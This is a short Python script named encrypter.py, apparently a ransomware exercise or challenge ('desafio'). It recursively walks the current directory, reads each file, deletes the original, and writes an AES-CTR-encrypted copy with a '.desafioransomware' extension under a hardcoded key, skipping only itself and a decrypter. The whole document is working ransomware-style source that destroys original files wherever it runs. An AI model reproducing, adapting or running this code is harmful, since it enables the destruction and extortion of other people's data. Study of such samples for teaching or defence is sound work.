import os
import pyaes

def encrypter(directory):
    for item in os.listdir(directory):
        itempath = os.path.join(directory, item)

        if item == "encrypter.py" or item == "decrypter.py":
            continue

        if os.path.isdir(itempath):
            encrypter(itempath)
        elif os.path.isfile(itempath):
            with open(itempath, "rb") as file:
                file_data = file.read()

            os.remove(itempath)

            key = b"desafioransomware"[:16]
            aes = pyaes.AESModeOfOperationCTR(key)

            crypto_data = aes.encrypt(file_data)

            newfile = itempath + ".desafioransomware"
            with open(newfile, "wb") as new_file:
                new_file.write(crypto_data)

if __name__ == "__main__":
    directory = "./"
    encrypter(directory)
